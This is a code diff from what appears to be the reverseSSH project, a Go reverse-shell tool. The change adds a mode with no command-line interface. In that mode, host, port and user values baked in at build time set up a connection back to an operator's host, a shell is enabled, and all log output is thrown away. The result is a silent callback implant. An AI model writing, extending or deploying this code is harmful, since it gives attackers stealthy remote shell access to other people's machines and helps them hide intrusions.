@@ -226,7 +226,11 @@ func createExtraInfoHandler() ssh.ChannelHandler {
 	}
 }
 
-func setupParameters() *params {
+func setupParameters(noCLI string) *params {
+	if noCLI != "" {
+		return setupParametersWithoutCLI()
+	}
+
 	var help = fmt.Sprintf(`reverseSSH v%[2]s  Copyright (C) 2021  Ferdinor <ferdinor@mailbox.org>
 
 Usage: %[1]s [options] [[<user>@]<target>]
@@ -313,6 +317,30 @@ Credentials:
 	}
 
 	return &p
+}
+
+func setupParametersWithoutCLI() *params {
+	lport, err := strconv.ParseUint(LPORT, 10, 32)
+	if err != nil {
+		log.Fatal("Cannot convert LPORT: ", err)
+	}
+	homeBindPort, err := strconv.ParseUint(BPORT, 10, 32)
+	if err != nil {
+		log.Fatal("Cannot convert BPORT: ", err)
+	}
+
+	log.SetOutput(ioutil.Discard)
+
+	return &params{
+		LUSER:        LUSER,
+		LHOST:        LHOST,
+		LPORT:        uint(lport),
+		homeBindPort: uint(homeBindPort),
+		listen:       false,
+		shell:        defaultShell,
+		noShell:      false,
+		verbose:      false,
+	}
 }
 
 func run(p *params, server ssh.Server) {
